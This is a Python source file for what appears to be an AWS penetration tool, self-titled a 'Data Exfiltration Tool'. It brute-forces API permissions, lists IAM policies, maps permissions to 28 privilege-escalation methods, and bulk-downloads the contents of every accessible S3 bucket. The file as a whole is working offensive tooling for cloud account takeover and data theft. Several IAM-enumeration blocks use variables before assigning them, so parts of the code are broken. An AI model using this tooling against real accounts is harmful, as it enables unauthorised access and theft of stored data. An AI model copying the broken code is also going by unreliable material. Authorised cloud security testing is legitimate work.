                inline_details.append({
                    "name":     policy_name,
                    "document": doc
                })

                # extract actions
                if "Statement" in doc:
                    for stmt in doc["Statement"]:
                        if stmt.get("Effect") == "Allow":
                            actions = stmt.get("Action", [])
                            if isinstance(actions, str):
                                actions = [actions]
                            all_permissions.extend(actions)

            except Exception as err:
                print(f"    {Fore.RED}       ❌ Error reading inline policy: {err}{Style.RESET_ALL}")

        # ─────────────────────────────────────────────────────
        # Permission summary (prints unchanged)
        # ─────────────────────────────────────────────────────
        if all_permissions:
            unique = list(set(all_permissions))
            print(f"    {Fore.MAGENTA}    📊 Permission Summary ({len(unique)} unique actions):{Style.RESET_ALL}")

            service_map = {}
            for perm in unique:
                svc = perm.split(":")[0] if ":" in perm else "Other"
                service_map.setdefault(svc, []).append(perm)

            for svc, perms in sorted(service_map.items()):
                print(f"    {Fore.CYAN}       {svc}: {len(perms)} actions{Style.RESET_ALL}")
                for p in sorted(perms)[:5]:
                    print(f"    {Fore.WHITE}         • {p}{Style.RESET_ALL}")
                if len(perms) > 5:
                    print(f"    {Fore.YELLOW}         ... and {len(perms) - 5} more{Style.RESET_ALL}")

        # ─────────────────────────────────────────────────────
        # Return rich dictionary
        # ─────────────────────────────────────────────────────
        return {
            "managed_policies": managed_details,
            "inline_policies":  inline_details,
            "permissions":      list(set(all_permissions))
        }

    except Exception as e:
        print(f"    {Fore.RED}❌ Error analyzing role permissions: {e}{Style.RESET_ALL}")
        return {}


def is_service_linked_role(role):
    """Check if a role is an AWS service-linked role that should be filtered out"""
    role_name = role["RoleName"]
    role_path = role.get("Path", "/")
    
    # Service-linked roles typically have these characteristics:
    service_role_indicators = [
        "AWSServiceRoleFor",
        "aws-service-role",
        "/service-role/",
        "/aws-service-role/"
    ]
    
    # Check role name
    if any(indicator in role_name for indicator in service_role_indicators):
        return True
    
    # Check role path
    if any(indicator in role_path for indicator in service_role_indicators):
        return True
    
    # Additional specific service role patterns
    service_role_prefixes = [
        "AWSServiceRole",
        "service-role-",
        "aws-",  # Be careful with this one, might be too broad
    ]
    
    # Only check prefixes for very specific patterns to avoid false positives
    if role_name.startswith("AWSServiceRole"):
        return True
    
    return False

def list_and_download_bucket(s3_client, bucket_name):
    """Recursively list and download all objects from a bucket"""
    print(f"\n{Fore.YELLOW}=== Processing Bucket: {bucket_name} ==={Style.RESET_ALL}")
    logger.info(f"Starting to process bucket: {bucket_name}")
    
    # Create local directory for bucket
    bucket_dir = Path("s3_downloads") / safe_filename(bucket_name)
    bucket_dir.mkdir(parents=True, exist_ok=True)
    
    try:
        # Get bucket location
        try:
            location = s3_client.get_bucket_location(Bucket=bucket_name)
            region = location.get('LocationConstraint', 'us-east-1')
            print(f"{Fore.CYAN}Bucket region: {region}{Style.RESET_ALL}")
            logger.info(f"Bucket {bucket_name} region: {region}")
            if region not in output_data["metadata"]["regions_scanned"]:
                output_data["metadata"]["regions_scanned"].append(region)
        except Exception as e:
            logger.warning(f"Could not get bucket location for {bucket_name}: {e}")
            print(f"{Fore.YELLOW}Could not get bucket location: {e}{Style.RESET_ALL}")
        
        # First, count total objects for progress bar
        print(f"{Fore.BLUE}Counting objects in bucket...{Style.RESET_ALL}")
        paginator = s3_client.get_paginator('list_objects_v2')
        page_iterator = paginator.paginate(Bucket=bucket_name)
        
        total_objects = 0
        total_size = 0
        objects_list = []
        
        for page in page_iterator:
            if 'Contents' in page:
                for obj in page['Contents']:
                    total_objects += 1
                    total_size += obj['Size']
                    objects_list.append(obj)
        
        if total_objects == 0:
            print(f"{Fore.YELLOW}No objects found in bucket {bucket_name}{Style.RESET_ALL}")
            logger.info(f"No objects found in bucket {bucket_name}")
            return
        
        print(f"{Fore.GREEN}Found {total_objects} objects ({total_size:,} bytes / {total_size/1024/1024:.2f} MB){Style.RESET_ALL}")
        logger.info(f"Bucket {bucket_name}: {total_objects} objects, {total_size} bytes")
        
        # Download with progress bar
        downloaded_count = 0
        with tqdm(total=total_objects, desc=f"Downloading from {bucket_name}",
                 unit="file", colour="green") as pbar:
            
            for obj in objects_list:
                obj_key = obj['Key']
                obj_size = obj['Size']
                
                pbar.set_description(f"Downloading {obj_key[:30]}... ({obj_size:,} bytes)")
                
                # Download the object
                if download_s3_object(s3_client, bucket_name, obj_key, bucket_dir, pbar):
                    downloaded_count += 1
        
        # Summary
        success_rate = (downloaded_count / total_objects) * 100
        print(f"\n{Fore.GREEN}Bucket Summary:{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Total objects: {total_objects}{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}Successfully downloaded: {downloaded_count}{Style.RESET_ALL}")
        print(f"  {Fore.BLUE}Success rate: {success_rate:.1f}%{Style.RESET_ALL}")
        print(f"  {Fore.MAGENTA}Total size: {total_size:,} bytes ({total_size/1024/1024:.2f} MB){Style.RESET_ALL}")
        
        logger.info(f"Bucket {bucket_name} summary: {downloaded_count}/{total_objects} downloaded ({success_rate:.1f}%)")

        # Store results for JSON output
        bucket_entry = {
            "name": bucket_name,
            "region": region,
            "objects": [obj["Key"] for obj in objects_list],
        }
        output_data["s3"]["buckets"].append(bucket_entry)
        
    except Exception as e:
        error_msg = f"Error processing bucket {bucket_name}: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

class AWSPrivEscAnalyzer:
    def __init__(self):
        # Define privilege escalation methods with required permissions
        self.privesc_methods = {
            1: {
                "name": "Creating a new policy version",
                "required_perms": ["iam:CreatePolicyVersion"],
                "description": "Create a new version of an IAM policy with custom permissions using the --set-as-default flag",
                "impact": "Full administrator access",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            2: {
                "name": "Setting the default policy version to an existing version",
                "required_perms": ["iam:SetDefaultPolicyVersion"],
                "description": "Change the default version to any other existing policy version that may have higher privileges",
                "impact": "Varies based on inactive policy versions (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            3: {
                "name": "Creating an EC2 instance with an existing instance profile",
                "required_perms": ["iam:PassRole", "ec2:RunInstances"],
                "description": "Create a new EC2 instance and pass an existing instance profile to access AWS keys from metadata",
                "impact": "Access to instance profile permissions (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            4: {
                "name": "Creating a new user access key",
                "required_perms": ["iam:CreateAccessKey"],
                "description": "Create access key ID and secret for another user if they don't have 2 sets already",
                "impact": "Same permissions as target user (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            5: {
                "name": "Creating a new login profile",
                "required_perms": ["iam:CreateLoginProfile"],
                "description": "Create a password for AWS console login on users without existing login profiles",
                "impact": "Same permissions as target user (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            6: {
                "name": "Updating an existing login profile",
                "required_perms": ["iam:UpdateLoginProfile"],
                "description": "Change the password for AWS console login on users with existing login profiles",
                "impact": "Same permissions as target user (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            7: {
                "name": "Attaching a policy to a user",
                "required_perms": ["iam:AttachUserPolicy"],
                "description": "Attach the AdministratorAccess policy or other high-privilege policies to a user",
                "impact": "Full administrator access",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            8: {
                "name": "Attaching a policy to a group",
                "required_perms": ["iam:AttachGroupPolicy"],
                "description": "Attach the AdministratorAccess policy to a group you're a member of",
                "impact": "Full administrator access",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            9: {
                "name": "Attaching a policy to a role",
                "required_perms": ["iam:AttachRolePolicy"],
                "description": "Attach the AdministratorAccess policy to a role you have access to",
                "impact": "Full administrator access",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            10: {
                "name": "Creating/updating an inline policy for a user",
                "required_perms": ["iam:PutUserPolicy"],
                "description": "Create or update an inline policy with arbitrary permissions for a user",
                "impact": "Full administrator access",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            11: {
                "name": "Creating/updating an inline policy for a group",
                "required_perms": ["iam:PutGroupPolicy"],
                "description": "Create or update an inline policy with arbitrary permissions for a group you're in",
                "impact": "Full administrator access",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            12: {
                "name": "Creating/updating an inline policy for a role",
                "required_perms": ["iam:PutRolePolicy"],
                "description": "Create or update an inline policy with arbitrary permissions for a role",
                "impact": "Full administrator access",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            13: {
                "name": "Adding a user to a group",
                "required_perms": ["iam:AddUserToGroup"],
                "description": "Add yourself to an existing IAM group with higher privileges",
                "impact": "Privileges of target group (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            14: {
                "name": "Updating the AssumeRolePolicyDocument of a role",
                "required_perms": ["iam:UpdateAssumeRolePolicy", "sts:AssumeRole"],
                "description": "Change assume role policy to allow you to assume any existing role",
                "impact": "Privileges of target role (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            15: {
                "name": "Passing a role to a new Lambda function, then invoking it",
                "required_perms": ["iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction"],
                "description": "Create Lambda function with existing service role and invoke it to perform actions",
                "impact": "Access to Lambda service role permissions (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            16: {
                "name": "Passing a role to a new Lambda function, then invoking it cross-account",
                "required_perms": ["iam:PassRole", "lambda:CreateFunction", "lambda:AddPermission"],
                "description": "Create Lambda function and allow cross-account invocation to execute with higher privileges",
                "impact": "Access to Lambda service role permissions (no escalation to full admin)",
                "link": "None"
            },
            17: {
                "name": "Passing a role to a new Lambda function, then triggering it with DynamoDB",
                "required_perms": ["iam:PassRole", "lambda:CreateFunction", "lambda:CreateEventSourceMapping"],
                "optional_perms": ["dynamodb:PutItem", "dynamodb:CreateTable"],
                "description": "Create Lambda function triggered by DynamoDB events to execute with higher privileges",
                "impact": "Access to Lambda service role permissions (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            18: {
                "name": "Updating the code of an existing Lambda function",
                "required_perms": ["lambda:UpdateFunctionCode"],
                "description": "Update existing Lambda function code to perform actions with its attached role",
                "impact": "Access to function's service role permissions (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            19: {
                "name": "Passing a role to a Glue Development Endpoint",
                "required_perms": ["iam:PassRole", "glue:CreateDevEndpoint"],
                "description": "Create Glue dev endpoint with existing service role and SSH into it",
                "impact": "Access to Glue service role permissions (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            20: {
                "name": "Updating an existing Glue Dev Endpoint",
                "required_perms": ["glue:UpdateDevEndpoint"],
                "description": "Update SSH public key of existing Glue dev endpoint to gain access",
                "impact": "Access to attached role permissions (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            21: {
                "name": "Passing a role to CloudFormation",
                "required_perms": ["iam:PassRole", "cloudformation:CreateStack"],
                "description": "Create CloudFormation stack with existing role to perform actions and create resources",
                "impact": "Access to passed role permissions (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            22: {
                "name": "Passing a role to Data Pipeline",
                "required_perms": ["iam:PassRole", "datapipeline:CreatePipeline", "datapipeline:PutPipelineDefinition"],
                "description": "Create data pipeline to run arbitrary AWS CLI commands with passed role permissions",
                "impact": "Access to passed role permissions (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
            },
            23: {
                "name": "Creating a CodeStar project from a template",
                "required_perms": ["codestar:CreateProjectFromTemplate"],
                "description": "Use undocumented CodeStar API to create project from built-in template with elevated privileges",
                "impact": "Reasonable privilege escalation, potential full admin access",
                "link": "https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/"
            },
            24: {
                "name": "Passing a role to a new CodeStar project",
                "required_perms": ["codestar:CreateProject", "iam:PassRole"],
                "description": "Create CodeStar project with passed role that has admin escalation capabilities",
                "impact": "Full administrator access (default CodeStar service role can escalate)",
                "link": "https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/"
            },
            25: {
                "name": "Creating a new CodeStar project and associating a team member",
                "required_perms": ["codestar:CreateProject", "codestar:AssociateTeamMember"],
                "description": "Create CodeStar project and associate yourself as Owner to get attached IAM policy",
                "impact": "Read-only access to multiple services and full CodeStar access",
                "link": "https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/"
            },
            26: {
                "name": "Adding a malicious Lambda layer to an existing Lambda function",
                "required_perms": ["lambda:UpdateFunctionConfiguration"],
                "description": "Attach Lambda layer to override libraries and execute malicious code with function's role",
                "impact": "Access to function's service role permissions (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2"
            },
            27: {
                "name": "Passing a role to a new SageMaker Jupyter notebook",
                "required_perms": ["sagemaker:CreateNotebookInstance", "sagemaker:CreatePresignedNotebookInstanceUrl", "iam:PassRole"],
                "description": "Create SageMaker Jupyter notebook with passed role and access credentials through UI",
                "impact": "Access to SageMaker service role permissions (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2"
            },
            28: {
                "name": "Gaining access to an existing SageMaker Jupyter notebook",
                "required_perms": ["sagemaker:CreatePresignedNotebookInstanceUrl"],
                "description": "Create signed URL for existing SageMaker notebook to access its credentials",
                "impact": "Access to notebook's service role permissions (no escalation to full admin)",
                "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2"
            }
        }

    def analyze_permissions(self, permissions):
        """
        Analyze given permissions and return possible privilege escalation paths
        
        Args:
            permissions (list): List of IAM permissions (e.g., ['iam:CreatePolicyVersion', 'ec2:RunInstances'])
        
        Returns:
            dict: Dictionary containing possible escalation methods
        """
        # Convert permissions to lowercase for case-insensitive matching
        user_perms = [perm.lower().strip() for perm in permissions]
        possible_methods = []
        
        print(f"[+] Analyzing {len(user_perms)} permissions...")
        print(f"[+] Permissions: {', '.join(permissions)}")
        print("\n" + "="*80)
        
        for method_id, method_info in self.privesc_methods.items():
            required_perms = [perm.lower() for perm in method_info["required_perms"]]
            optional_perms = []
            
            if "optional_perms" in method_info:
                optional_perms = [perm.lower() for perm in method_info["optional_perms"]]
            
            # Check if all required permissions are present
            has_required = all(perm in user_perms for perm in required_perms)
            
            if has_required:
                # Check for optional permissions
                has_optional = []
                for opt_perm in optional_perms:
                    if opt_perm in user_perms:
                        has_optional.append(opt_perm)
                
                method_result = {
                    "id": method_id,
                    "name": method_info["name"],
                    "description": method_info["description"],
                    "impact": method_info["impact"],
                    "link": method_info["link"],
                    "required_permissions": method_info["required_perms"],
                    "optional_permissions": method_info.get("optional_perms", []),
                    "optional_found": has_optional
                }
                
                possible_methods.append(method_result)
        
        return possible_methods

    def print_results(self, methods):
        """Print the analysis results in a formatted way"""
        
        if not methods:
            print("[-] No privilege escalation methods found for the given permissions.")
            return
            
        print(f"[+] Found {len(methods)} possible privilege escalation method(s):")
        print("\n")
            
        # Sort by impact (full admin first)
        high_impact = [m for m in methods if "full administrator" in m["impact"].lower()]
        medium_impact = [m for m in methods if m not in high_impact and ("reasonable" in m["impact"].lower() or "read-only" in m["impact"].lower())]
        low_impact = [m for m in methods if m not in high_impact and m not in medium_impact]
            
        all_methods = high_impact + medium_impact + low_impact
            
        for i, method in enumerate(all_methods, 1):
            # Determine risk level
            if method in high_impact:
                risk_level = "🔴 HIGH RISK"
            elif method in medium_impact:
                risk_level = "🟡 MEDIUM RISK"
            else:
                risk_level = "🟢 LOW RISK"
                
            print(f"{'='*80}")
            print(f"Method #{method['id']}: {method['name']}")
            print(f"Risk Level: {risk_level}")
            print(f"{'='*80}")
                
            print(f"\n📋 Description:")
            print(f"   {method['description']}")
                
            print(f"\n🎯 Potential Impact:")
            print(f"   {method['impact']}")
                
            print(f"\n🔑 Required Permissions:")
            for perm in method['required_permissions']:
                print(f"   ✓ {perm}")
                
            if method['optional_permissions']:
                print(f"\n🔑 Optional Permissions:")
                for perm in method['optional_permissions']:
                    status = "✓" if perm.lower() in [p.lower() for p in method['optional_found']] else "✗"
                    print(f"   {status} {perm}")
                
            print(f"\n🔗 Reference:")
            print(f"   {method['link']}")
                
            print("\n")

def extract_permissions_from_policy(policy_document):
    if isinstance(policy_document, dict):
        statements = policy_document.get('Statement', [])
        if not isinstance(statements, list):
            statements = [statements]
        
        for statement in statements:
            if statement.get('Effect') == 'Allow':
                actions = statement.get('Action', [])
                if isinstance(actions, str):
                    actions = [actions]
                
                for action in actions:
                    if action not in permissions:
                        permissions.append(action)

def camel_to_snake(name):
    """Convert CamelCase API call name to boto3 method format"""
    import re
    s1 = re.sub('(.)([A-Z][a-z]+)', r'\1_\2', name)
    return re.sub('([a-z0-9])([A-Z])', r'\1_\2', s1).lower()

def bruteforce_aws_permissions_from_json(json_path, session):
    global permissions, bruteforced_permissions

    valid_services = boto3.session.Session().get_available_services()

    with open(json_path, 'r') as f:
        services = json.load(f)

    for service in services:
        svc_name = service["svc_name"]
        api_calls = service["api_calls"]

        if svc_name not in valid_services:
            logger.warning(f"Skipping {svc_name} - not a valid boto3 service")
            continue

        try:
            # Add timeouts to prevent hang-ups
            timeout_config = Config(connect_timeout=3, read_timeout=3, retries={'max_attempts': 1})
            client = session.client(svc_name, config=timeout_config)
        except Exception as e:
            logger.warning(f"Skipping {svc_name} - client init failed: {e}")
            continue

        with tqdm(total=len(api_calls), desc=f"[{svc_name.upper()}]", unit="call", colour="green") as pbar:
            for api_call in api_calls:
                try:
                    method = getattr(client, camel_to_snake(api_call))
                    method()
                    perm_string = f"{svc_name}:{api_call}"
                    if perm_string not in permissions:
                        permissions.append(perm_string)
                    if perm_string not in bruteforced_permissions:
                        bruteforced_permissions.append(perm_string)
                except (ClientError, EndpointConnectionError):
                    # Expected errors: permission denied or endpoint not available
                    pass
                except Exception:
                    # Catch-all for timeouts, hangs, etc.
                    pass
                finally:
                    pbar.update(1)

def ask_to_bruteforce(session):
    answer = input(f"\n{Fore.YELLOW}⚡ Do you want to brute-force all AWS permissions(Estimated time 5m)? (y/n): {Style.RESET_ALL}").strip().lower()
    if answer in ['y', 'yes']:
        json_path = "final_full_aws_service_apis.json"
        print(f"{Fore.BLUE}🔍 Starting brute-force using {json_path}{Style.RESET_ALL}")
        bruteforce_aws_permissions_from_json(json_path, session)
        print(f"{Fore.GREEN}✅ Finished! Permissions granted:{Style.RESET_ALL}")
        for perm in permissions:
            print(f"  {Fore.CYAN}{perm}{Style.RESET_ALL}")

# Header
# -*- coding: utf-8 -*-

args = parse_arguments()
analyzer = AWSPrivEscAnalyzer()

if load_env_file(args.env_file):
        print(f"{Fore.GREEN}✅ Loaded environment variables from {args.env_file}{Style.RESET_ALL}")

# Handle list profiles
if args.list_profiles:
    profiles = list_available_profiles()
    print(f"{Fore.CYAN}Available AWS profiles:{Style.RESET_ALL}")
    for i, profile in enumerate(profiles, 1):
        print(f"{Fore.GREEN}{i}. {profile}{Style.RESET_ALL}")
    sys.exit(0)

print("""
 ██████╗██╗      ██████╗ ██╗   ██╗██████╗ ████████╗ █████╗ ██████╗ 
██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
██║     ██║     ██║   ██║██║   ██║██║  ██║   ██║   ███████║██████╔╝
██║     ██║     ██║   ██║██║   ██║██║  ██║   ██║   ██╔══██║██╔═══╝ 
╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝   ██║   ██║  ██║██║     
 ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝     
""")
print(f"{Fore.CYAN}{Back.BLACK}")
print("=" * 60)
print("    AWS Security Assessment & Data Exfiltration Tool")
print("=" * 60)
print(f"{Style.RESET_ALL}")

logger.info("Starting AWS Security Assessment")

# Get credentials
access_key = None
secret_access_key = None
session_token = None
region = None

if args.keys:
    print(f"{Fore.BLUE}🔑 Loading credentials from profile: {args.keys}{Style.RESET_ALL}")
    credentials = get_aws_credentials_from_profile(args.keys)
    
    if credentials:
        access_key = credentials['access_key']
        secret_access_key = credentials['secret_key']
        session_token = credentials.get('session_token')
        region = credentials['region']
        if region not in output_data["metadata"]["regions_scanned"]:
            output_data["metadata"]["regions_scanned"].append(region)
        
        print(f"{Fore.GREEN}✅ Successfully loaded credentials from profile '{args.keys}'{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📍 Region: {region}{Style.RESET_ALL}")
        output_data["metadata"]["profile"] = args.keys
        
        if session_token:
            print(f"{Fore.MAGENTA}🎫 Using temporary credentials (session token found){Style.RESET_ALL}")
        else:
            print(f"{Fore.BLUE}🔑 Using permanent credentials (no session token){Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}❌ Failed to load credentials from profile '{args.keys}'{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📋 Available profiles:{Style.RESET_ALL}")
        profiles = list_available_profiles()
        for profile in profiles:
            print(f"  {Fore.CYAN}- {profile}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Use --list-profiles to see all available profiles{Style.RESET_ALL}")
        sys.exit(1)
else:
    # Manual credential input (original behavior)
    print(f"{Fore.YELLOW}Please provide AWS credentials:{Style.RESET_ALL}")
    access_key = input(f"{Fore.GREEN}Enter AWS Access Key ID: {Style.RESET_ALL}").strip()
    secret_access_key = input(f"{Fore.GREEN}Enter AWS Secret Access Key: {Style.RESET_ALL}").strip()
    session_token = input(f"{Fore.GREEN}Enter AWS Session Token (leave blank if not using temporary credentials): {Style.RESET_ALL}").strip()
    region = input(f"{Fore.GREEN}Enter AWS Region [default: us-east-1]: {Style.RESET_ALL}").strip() or 'us-east-1'
    output_data["metadata"]["profile"] = "manual"
    if region not in output_data["metadata"]["regions_scanned"]:
        output_data["metadata"]["regions_scanned"].append(region)

# Always prompt for bucket and other options regardless of how credentials were obtained
bucket = input(f"{Fore.GREEN}Enter specific S3 Bucket name (leave blank to scan all accessible buckets): {Style.RESET_ALL}").strip()

logger.info(f"Configured for region: {region}")
if session_token:
    logger.info("Using temporary credentials with session token")
    print(f"{Fore.CYAN}📋 Using temporary credentials (session token provided){Style.RESET_ALL}")
else:
    logger.info("Using permanent credentials (no session token)")
    print(f"{Fore.CYAN}🔑 Using permanent credentials (no session token){Style.RESET_ALL}")

# Initiating AWS session
print(f"\n{Fore.BLUE}Initializing AWS session...{Style.RESET_ALL}")
try:
    # Build session parameters
    session_params = {
        'aws_access_key_id': access_key,
        'aws_secret_access_key': secret_access_key,
        'region_name': region
    }
    
    # Add session token only if provided
    if session_token:
        session_params['aws_session_token'] = session_token
    
    session = boto3.Session(**session_params)

    # Initialize clients
    s3_client = session.client("s3")
    sns_client = session.client("sns")
    sts_client = session.client("sts")
    secrets_client = session.client("secretsmanager")
    iam_client = session.client("iam")
    lambda_client = session.client("lambda")
    
    print(f"{Fore.GREEN}✅ AWS session initialized successfully{Style.RESET_ALL}")
    logger.info("AWS session initialized successfully")
    
except Exception as e:
    error_msg = f"Failed to initialize AWS session: {e}"
    logger.error(error_msg)
    print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
    sys.exit(1)

# Print STS identity
username = None
print(f"\n{Fore.YELLOW}=== Identity Information ==={Style.RESET_ALL}")
try:
    sts_caller_info = sts_client.get_caller_identity()
    print(f"{Fore.CYAN}UserId: {sts_caller_info['UserId']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Account: {sts_caller_info['Account']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}ARN: {sts_caller_info['Arn']}{Style.RESET_ALL}")
    output_data["identity"] = {
        "UserId": sts_caller_info["UserId"],
        "Account": sts_caller_info["Account"],
        "Arn": sts_caller_info["Arn"],
        "credentialType": "temporary" if session_token else "permanent",
    }
    
    # Show credential type information
    if session_token:
        print(f"{Fore.MAGENTA}Credential Type: Temporary (using session token){Style.RESET_ALL}")
        if 'assumed-role' in sts_caller_info['Arn']:
            role_parts = sts_caller_info['Arn'].split('/')
            if len(role_parts) >= 2:
                assumed_role = role_parts[1]
                session_name = role_parts[2] if len(role_parts) > 2 else 'unknown'
                print(f"{Fore.YELLOW}Assumed Role: {assumed_role}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Session Name: {session_name}{Style.RESET_ALL}")
    else:
        print(f"{Fore.BLUE}Credential Type: Permanent (IAM user){Style.RESET_ALL}")
    
    logger.info(f"Identity: {sts_caller_info['Arn']}")

    arn_parts = sts_caller_info['Arn'].split('/')
    if len(arn_parts) >= 2:
        username = arn_parts[-1]
        logger.info(f"Extracted username: {username}")
        
except Exception as e:
    error_msg = f"Error getting caller identity: {e}"
    logger.error(error_msg)
    print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

# IAM user policy/group info (only for permanent credentials)
if username and not session_token:
    print(f"\n{Fore.YELLOW}=== IAM Info for User: {username} ==={Style.RESET_ALL}")
    logger.info(f"Analyzing IAM permissions for user: {username}")

    try:
        # Attached managed policies
        attached_policies = iam_client.list_attached_user_policies(UserName=username)
        print(f"\n{Fore.MAGENTA}Attached Managed Policies:{Style.RESET_ALL}")
        attached_policy_names = []
        for policy in attached_policies.get("AttachedPolicies", []):
            print(f" {Fore.GREEN}- {policy['PolicyName']} (ARN: {policy['PolicyArn']}){Style.RESET_ALL}")
            logger.info(f"Found attached policy: {policy['PolicyName']}")
            attached_policy_names.append(policy['PolicyName'])
            attached_policy_details.append({
                "name":  policy["PolicyName"],
                "arn":   policy["PolicyArn"],
                "default_version": version_id,
                "document": policy_version["PolicyVersion"]["Document"]
            })
            
            policy_detail = iam_client.get_policy(PolicyArn=policy["PolicyArn"])
            version_id = policy_detail["Policy"]["DefaultVersionId"]
            policy_version = iam_client.get_policy_version(
                PolicyArn=policy["PolicyArn"],
                VersionId=version_id
            )
            print(f"   {Fore.BLUE}Permissions for {policy['PolicyName']} (Default Version {version_id}):{Style.RESET_ALL}")
            print_policy_document(policy_version["PolicyVersion"]["Document"])
            extract_permissions_from_policy(policy_version["PolicyVersion"]["Document"])

            # Ask if user wants to list all versions
            list_versions = input(f"\n{Fore.CYAN}Do you want to list all versions of policy '{policy['PolicyName']}'? (y/N): {Style.RESET_ALL}").strip().lower()
            if list_versions in ['y', 'yes']:
                try:
                    policy_versions = iam_client.list_policy_versions(PolicyArn=policy["PolicyArn"])
                    print(f"\n   {Fore.YELLOW}All versions of {policy['PolicyName']}:{Style.RESET_ALL}")
                    
                    for version in policy_versions.get("Versions", []):
                        version_id = version["VersionId"]
                        is_default = version["IsDefaultVersion"]
                        create_date = version["CreateDate"].strftime("%Y-%m-%d %H:%M:%S")
                        status = "DEFAULT" if is_default else "NON-DEFAULT"
                        
                        print(f"     {Fore.CYAN}Version {version_id} ({status}) - Created: {create_date}{Style.RESET_ALL}")
                        
                        # Get the policy document for this version
                        version_detail = iam_client.get_policy_version(
                            PolicyArn=policy["PolicyArn"],
                            VersionId=version_id
                        )
                        print(f"     {Fore.BLUE}Permissions:{Style.RESET_ALL}")
                        # Indent the policy document output
                        import json
                        policy_doc = version_detail["PolicyVersion"]["Document"]
                        formatted_doc = json.dumps(policy_doc, indent=4)
                        indented_doc = '\n'.join(['       ' + line for line in formatted_doc.split('\n')])
                        print(indented_doc)
                        print()  # Add spacing between versions
                        
                except Exception as e:
                    print(f"     {Fore.RED}Error listing versions for {policy['PolicyName']}: {e}{Style.RESET_ALL}")
                    logger.error(f"Error listing policy versions: {e}")

        # Inline policies
        inline_policies = iam_client.list_user_policies(UserName=username)
        print(f"\n{Fore.MAGENTA}Inline Policies:{Style.RESET_ALL}")
        inline_policy_names = []
        for policy_name in inline_policies.get("PolicyNames", []):
            print(f" {Fore.GREEN}- {policy_name}{Style.RESET_ALL}")
            logger.info(f"Found inline policy: {policy_name}")
            inline_policy_names.append(policy_name)
            inline_policy_details.append({
                "name": policy_name,
                "document": policy_doc["PolicyDocument"]
            })

            
            policy_doc = iam_client.get_user_policy(UserName=username, PolicyName=policy_name)
            print(f"   {Fore.BLUE}Permissions:{Style.RESET_ALL}")
            print_policy_document(policy_doc["PolicyDocument"])
            extract_permissions_from_policy(policy_doc["PolicyDocument"])

        # Group memberships
        user_groups = iam_client.list_groups_for_user(UserName=username)
        print(f"\n{Fore.MAGENTA}Groups:{Style.RESET_ALL}")
        group_names = []
        # ---------------------------------------------------------
        # GROUP MEMBERSHIPS
        # ---------------------------------------------------------
        for group in user_groups.get("Groups", []):
            group_name = group["GroupName"]
            print(f" {Fore.GREEN}- {group_name} (ARN: {group['Arn']}){Style.RESET_ALL}")
            logger.info(f"Found group membership: {group_name}")
            group_names.append(group_name)

            # Lists that will feed the JSON structure
            group_policy_details        = []   # managed policies (full docs)
            group_inline_policy_details = []   # inline policies (full docs)

            # ──────────────────────────────────────────────────────
            # 1) Managed policies attached to the group
            # ──────────────────────────────────────────────────────
